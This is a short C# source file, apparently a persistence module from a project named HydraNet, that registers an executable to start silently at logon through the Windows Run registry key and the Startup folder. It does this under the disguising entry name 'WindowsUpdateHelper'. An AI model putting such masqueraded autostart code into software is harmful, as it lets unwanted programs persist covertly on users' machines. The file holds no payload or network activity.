namespace HydraNet.Persistence;

using Microsoft.Win32;

public sealed class AutoStart
{
    private const string RegistryPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    private const string TaskName = "WindowsUpdateHelper";

    public bool InstallRegistry(string executablePath)
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RegistryPath, writable: true);
            key?.SetValue(TaskName, $"\"{executablePath}\" --silent");
            return true;
        }
        catch
        {
            return false;
        }
    }

    public bool RemoveRegistry()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RegistryPath, writable: true);
            key?.DeleteValue(TaskName, throwOnMissingValue: false);
            return true;
        }
        catch
        {
            return false;
        }
    }

    public bool IsInstalled()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RegistryPath);
            return key?.GetValue(TaskName) is not null;
        }
        catch
        {
            return false;
        }
    }

    public bool CopyToStartupFolder(string sourcePath)
    {
        try
        {
            var startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            var destPath = Path.Combine(startupFolder, Path.GetFileName(sourcePath));
            File.Copy(sourcePath, destPath, overwrite: true);
            return true;
        }
        catch
        {
            return false;
        }
    }
}
